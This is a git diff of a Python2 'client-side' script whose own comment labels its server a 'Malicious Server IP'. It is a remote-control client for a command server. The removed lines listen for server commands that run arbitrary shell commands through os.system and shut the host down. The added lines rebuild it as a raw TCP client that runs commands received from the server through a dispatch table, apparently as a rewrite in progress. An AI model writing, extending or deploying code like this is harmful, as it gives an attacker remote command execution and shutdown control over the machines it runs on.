@@ -2,29 +2,29 @@
 #  by Landon in Python2
 #    CLIENT-SIDE C0DE
 
-from urllib2 import urlopen
-from socketIO_client import SocketIO
-import os
+import socket
 
 bigBro = '127.0.0.1' # Malicious Server IP.
-socket = SocketIO("http://" + bigBro, 1984)
 
-# Functions for socket listeners.
-class listeners:
+clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+clientSocket.connect(( bigBro, 8080 )) # To-do: Change port later. 
 
-    def log(*args):
-        print(args[0])
+class commands:
+    def log( output ):
+        print( output )
 
-    def kill(*args):
-        if os.name == 'nt': # - Windows NT -
-            os.system("shutdown -s")
-        else:               # - GNU/Linux & MacOS -
-            os.system("shutdown now")
+turnedOn = True
+while turnedOn:
+    message = clientSocket.recv(2048)
 
-    def shell(*args):
-        os.system(args[0])
+    if message == "kill": turnedOn = False
 
-# These three lines set and wait for listeners.
-for function in listeners.__dict__:
-    socket.on(function, listeners.__dict__[function])
-socket.wait()
+    message = message.split(" ", 1)
+
+    if len(message) == 2:
+        command, arg = message
+
+    if command in commands.__dict__:
+        commands.__dict__[command]( arg )
+
+clientSocket.close()
